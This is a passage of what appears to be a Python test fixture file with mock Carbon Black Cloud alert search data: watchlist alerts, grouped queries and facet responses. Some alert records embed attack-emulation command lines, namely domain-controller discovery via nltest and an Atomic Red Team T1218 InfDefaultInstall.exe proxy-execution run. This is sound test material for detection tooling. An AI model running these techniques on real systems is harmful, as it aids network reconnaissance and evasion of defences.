                "process_issuer": [
                    ""
                ],
                "process_publisher": [
                    ""
                ],
                "parent_guid": "ABCD1234-01221fe8-0000213c-00000000-1d9fc7b9a727a6d",
                "parent_pid": 8508,
                "parent_name": "c:\\windows\\system32\\cmd.exe",
                "parent_sha256": "8258756c2e0ca794af527258e8a3a4f7431fbd7df44403603b94cb2a70cb1bdf",
                "parent_md5": "00837ec16fd4063b27d4327b5ae85657",
                "parent_effective_reputation": "ADAPTIVE_WHITE_LIST",
                "parent_reputation": "NOT_LISTED",
                "parent_cmdline": "\"cmd.exe\" /c \"nltest.exe /dclist:%userdnsdomain%\"",
                "parent_username": "3DOT5-DO-NOT-UP\\bit9qa",
                "childproc_guid": "",
                "childproc_username": "",
                "childproc_cmdline": ""
            }
        }
    ],
    "group_by_total_count": 2335
}

MOST_RECENT_ALERT = {
    "org_key": "ABCD1234",
    "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
    "id": "d6f05ce5-23ad-4cf0-a4d8-ee564396b2d1",
    "type": "WATCHLIST",
    "backend_timestamp": "2023-10-30T17:32:02.851Z",
    "user_update_timestamp": None,
    "backend_update_timestamp": "2023-10-30T17:32:02.851Z",
    "detection_timestamp": "2023-10-30T17:30:04.587Z",
    "first_event_timestamp": "2023-10-30T17:19:22.943Z",
    "last_event_timestamp": "2023-10-30T17:19:22.943Z",
    "severity": 1,
    "reason": "Process cmd.exe was detected by the report \"scale and performance test report\" in "
              "watchlist \"perf_automation_feed_qrcialhx\"",
    "reason_code": "5319dc28-4f8b-3a9f-84c6-e045c5e186ff:920e0ded-e95b-3d77-8eaa-e28bdaa133f2",
    "threat_id": "5319DC284F8B2A9FC4C6E045C5E186FF",
    "primary_event_id": "o6NwqERTQf6eYlD0kvpRLw-0",
    "policy_applied": "NOT_APPLIED",
    "run_state": "RAN",
    "sensor_action": "ALLOW",
    "workflow": {
        "change_timestamp": "2023-10-30T17:32:02.851Z",
        "changed_by_type": "SYSTEM",
        "changed_by": "ALERT_CREATION",
        "closure_reason": "NO_REASON",
        "status": "OPEN"
    },
    "determination": {
        "change_timestamp": "2023-10-30T17:32:02.851Z",
        "value": "NONE",
        "changed_by_type": "SYSTEM",
        "changed_by": "ALERT_CREATION"
    },
    "tags": None,
    "alert_notes_present": False,
    "threat_notes_present": False,
    "asset_id": None,
    "is_updated": False,
    "device_id": 18118176,
    "device_name": "pscr-test-01-1677785033.788122-22",
    "device_uem_id": "",
    "device_target_value": "LOW",
    "device_policy": "Pscr SE Testing",
    "device_policy_id": 465946,
    "device_os": "WINDOWS",
    "device_os_version": "Windows 10 x64 SP: 1",
    "device_username": "pscr-test-01-1677785033.788122-22@carbonblack.com",
    "device_location": "UNKNOWN",
    "device_external_ip": "10.10.10.10",
    "mdr_alert": False,
    "mdr_alert_notes_present": False,
    "mdr_threat_notes_present": False,
    "report_id": "vnbrUmClRh2Mh8398QtJww-scale_perf_automation_report01_qrcialhx",
    "report_name": "scale and performance test report",
    "report_description": "scale and performance test description",
    "report_tags": [],
    "ioc_id": "scale_perf_automation_report01_ioc01_qrcialhx",
    "ioc_hit": "process_name:cmd.exe",
    "watchlists": [
        {
            "id": "gSpaq0J9QB1qRY3lEdAw",
            "name": "perf_automation_feed_qrcialhx"
        }
    ],
    "process_guid": "ABCD1234-01147620-00780012-00000000-19db1ded53e8000",
    "process_pid": 7864338,
    "process_name": "cmd.exe",
    "process_sha256": "bb5743ff9ce542b7018d712597b2f3e2868e89feaf8d76253324644fbeda1899",
    "process_md5": "0a56e038d66da45947f8fdf130aef2d5",
    "process_effective_reputation": "LOCAL_WHITE",
    "process_reputation": "NOT_LISTED",
    "process_cmdline": "cmd.exe /c InfDefaultInstall.exe C:\\Users\\bit9qa\\AtomicRedTeam\\"
                       "atomic-red-team-vmware-develop\\atomics\\T1218\\src\\Infdefaultinstall.inf",
    "process_username": "NT AUTHORITY\\SYSTEM",
    "process_issuer": [
        "Moravec Code Signing CA - G2"
    ],
    "process_publisher": [
        "Moravec Test Authority"
    ],
    "childproc_guid": "",
    "childproc_username": "",
    "childproc_cmdline": ""
}

GROUP_SEARCH_ALERT_REQUEST_OVERRIDE_GROUPBY = {
    "group_by": {
        "field": "NOT_THREAT_ID"
    },
    "time_range": {
        "range": "-10d"
    },
    "criteria": {
        "type": [
            "WATCHLIST"
        ],
        "minimum_severity": 1
    },
    "rows": 1,
    "sort": [
        {
            "field": "count",
            "order": "DESC"
        }
    ]
}


ALERT_SEARCH_RESPONSE = {
    "results": [
        {
            "org_key": "ABC12345",
            "alert_url": "test.io/alerts?s[c][query_string]=id:14b3238e-cff8-49bf-a1c0-d0c6587d41e4&orgKey=EWRTY2PK",
            "id": "14b3238e-cff8-49bf-a1c0-d0c6587d41e4",
            "type": "WATCHLIST",
            "backend_timestamp": "2023-12-01T14:28:24.337Z",
            "user_update_timestamp": None,
            "backend_update_timestamp": "2023-12-01T14:28:24.337Z",
            "detection_timestamp": "2023-12-01T14:25:18.539Z",
            "first_event_timestamp": "2023-12-01T14:19:44.392Z",
            "last_event_timestamp": "2023-12-01T14:19:44.392Z",
            "severity": 1,
            "reason": "Process cmd.exe was detected by the report \"scale and performance test report\" in watchlist "
                      "\"perf_automation_feed_qrcialhx\"",
            "reason_code": "5319dc28-4f8b-3a9f-84c6-e045c5e186ff:920e0ded-e95b-3d77-8eaa-e28bdaa133f2",
            "threat_id": "5319DC284F8B2A9FC4C6E045C5E186FF",
            "primary_event_id": "XWBgs6G8TOuqc4NzjvWHDg-0",
            "policy_applied": "NOT_APPLIED",
            "run_state": "RAN",
            "sensor_action": "ALLOW",
            "workflow": {
                "change_timestamp": "2023-12-01T14:28:24.337Z",
                "changed_by_type": "SYSTEM",
                "changed_by": "ALERT_CREATION",
                "closure_reason": "NO_REASON",
                "status": "OPEN"
            },
            "determination": {
                "change_timestamp": "2023-12-01T14:28:24.337Z",
                "value": "NONE",
                "changed_by_type": "SYSTEM",
                "changed_by": "ALERT_CREATION"
            },
            "tags": None,
            "alert_notes_present": False,
            "threat_notes_present": False,
            "asset_id": None,
            "is_updated": False,
            "device_id": 18118170,
            "device_name": "test",
            "device_uem_id": "",
            "device_target_value": "LOW",
            "device_policy": "Pscr SE Testing",
            "device_policy_id": 465946,
            "device_os": "WINDOWS",
            "device_os_version": "Windows 10 x64 SP: 1",
            "device_username": "test@carbonblack.com",
            "device_location": "UNKNOWN",
            "device_external_ip": "10.10.10.10",
            "mdr_alert": False,
            "mdr_alert_notes_present": False,
            "mdr_threat_notes_present": False,
            "report_id": "vnbrUmClRh2Mh8398QtJww-scale_perf_automation_report01_qrcialhx",
            "report_name": "scale and performance test report",
            "report_description": "scale and performance test description",
            "report_tags": [],
            "ioc_id": "scale_perf_automation_report01_ioc01_qrcialhx",
            "ioc_hit": "process_name:cmd.exe",
            "watchlists": [
                {
                    "id": "gSpaq0J9QB1qRY3lEdAw",
                    "name": "perf_automation_feed_qrcialhx"
                }
            ],
            "process_guid": "EWRTY2PK-0114761a-009367dc-00000000-19db1ded53e8000",
            "process_pid": 9660380,
            "process_name": "cmd.exe",
            "process_sha256": "b1f11107d63211d73c04020c7390e2b3070750d45ac89ccbb06450ae6dcadd2f",
            "process_md5": "40c8804dd11a4e54121172fe891c2e9a",
            "process_effective_reputation": "LOCAL_WHITE",
            "process_reputation": "NOT_LISTED",
            "process_cmdline": "cmd.exe /c InfDefaultInstall.exe C:\\Users\\bit9qa\\Infdefaultinstall.inf",
            "process_username": "NT AUTHORITY\\SYSTEM",
            "process_issuer": [
                "Moravec Code Signing CA - G2"
            ],
            "process_publisher": [
                "Moravec Test Authority"
            ],
            "childproc_guid": "",
            "childproc_username": "",
            "childproc_cmdline": ""
        }
    ],
    "num_found": 1236,
    "num_available": 1236
}

GROUPED_ALERT_FACET_REQUEST = {
    "group_by": {
        "field": "THREAT_ID"
    },
    "terms": {
        "fields": [
            "type",
            "THREAT_ID"
        ],
        "rows": 0
    },
    "criteria": {
        "minimum_severity": 3
    },
    "exclusions": {
        "type": [
            "HOST_BASED_FIREWALL",
            "CONTAINER_RUNTIME"
        ]
    },
    "filter_values": True
}

GROUPED_ALERT_FACET_RESPONSE = {
    "results": [
        {
            "field": "threat_id",
            "values": [
                {
                    "total": 1,
                    "id": "0f8d8b5eb2ccc09ad3d2c01c6b10af7e4279f58202e49cfad93d8fab7581d294",
                    "name": "0f8d8b5eb2ccc09ad3d2c01c6b10af7e4279f58202e49cfad93d8fab7581d294"
                },
                {
                    "total": 1,
                    "id": "13C37200E1CE8F8F7DBE4C7647291BCB",
                    "name": "13C37200E1CE8F8F7DBE4C7647291BCB"
                },
                {
                    "total": 1,
                    "id": "1B32B7CF7C3D40F117B46EC2E39530C9",
                    "name": "1B32B7CF7C3D40F117B46EC2E39530C9"
                },
                {
                    "total": 1,
                    "id": "1ce583a1df38f9020253fbf6092f82fa",
                    "name": "1ce583a1df38f9020253fbf6092f82fa"
                },
                {
                    "total": 1,
                    "id": "2ECAD3461EBF6E7E12F4C4DCB013667D",
                    "name": "2ECAD3461EBF6E7E12F4C4DCB013667D"
                },
                {
                    "total": 1,
                    "id": "30CD659F716EB1174FAF3FD71438A04B",
                    "name": "30CD659F716EB1174FAF3FD71438A04B"
                },
                {
                    "total": 1,
                    "id": "379dd07932c4bb76514e822056941023",
                    "name": "379dd07932c4bb76514e822056941023"
                },
                {
                    "total": 1,
                    "id": "3a99805c53d208b55d1de91f385018b01a1861069e8a11c7d28b9b8e008ca47a",
                    "name": "3a99805c53d208b55d1de91f385018b01a1861069e8a11c7d28b9b8e008ca47a"
                },
                {
                    "total": 1,
                    "id": "45DC740C4FA77899B555E08B99F539B1",
                    "name": "45DC740C4FA77899B555E08B99F539B1"
                },
                {
                    "total": 1,
                    "id": "5098E61E1E31B6E95C9C1257A465B669",
                    "name": "5098E61E1E31B6E95C9C1257A465B669"
                }
            ]
        },
        {
            "field": "type",
            "values": [
                {
                    "total": 13,
                    "id": "WATCHLIST",
                    "name": "WATCHLIST"
                },
                {
                    "total": 13,
                    "id": "CB_ANALYTICS",
                    "name": "CB_ANALYTICS"
                }
            ]
        }
    ]
}
